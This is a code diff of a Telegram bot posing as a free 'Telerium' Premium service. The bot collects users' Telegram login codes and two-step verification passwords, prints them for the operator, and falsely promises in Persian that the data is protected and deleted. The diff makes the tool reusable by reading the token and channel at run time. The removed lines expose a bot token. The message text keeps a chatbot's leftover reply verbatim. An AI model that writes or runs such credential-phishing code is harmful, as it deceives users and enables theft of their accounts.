@@ -1,9 +1,10 @@
 import telebot
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
 print("github -> https://github.com/inits5/\ntelegram -> @inits5\n")
-
-bot = telebot.TeleBot("7372012938:AAHnYSsIKa5YUaZlgxBtNHiFEyX3rY7k3Eg")  
-CHANNEL_USERNAME = "@telerium_permium" 
+api = input("api token -> ")
+channel = input("channel - (The bot must be an admin) -> ")
+bot = telebot.TeleBot(api)  
+CHANNEL_USERNAME = channel
 
 def print_user_info(user_id, username):
     print("="*30)
@@ -69,7 +70,7 @@ def request_two_factor_code(message):
 
     print(f"Code entered by user: {code}")
 
-    bot.send_message(message.chat.id, """ اگر حساب شما با تأیید دو مرحله‌ای محافظت می‌شود 🔒، آن را وارد کنید؛ در غیر این صورت عدد ۵ را ارسال کنید. 📱
+    bot.send_message(message.chat.id, """البته! در اینجا متن شما با ایموجی‌های مناسب اضافه شده است: "اگر حساب شما با تأیید دو مرحله‌ای محافظت می‌شود 🔒، آن را وارد کنید؛ در غیر این صورت عدد ۵ را ارسال کنید. 📱
 لطفاً توجه داشته باشید که تمامی اطلاعات ذخیره شده از شما در ربات تلریوم حفاظت می‌شود 🛡️ و تضمین اطلاعات شما به عهده ربات تلریوم است.
 همچنین توجه کنید که این اطلاعات بعد از پرمیوم شدن حساب شما حذف می‌شود 🗑️." امیدوارم این نسخه جذاب‌تر و قابل فهم‌تر باشد! اگر نیاز به تغییرات بیشتری دارید، لطفاً بفرمایید.""")
 
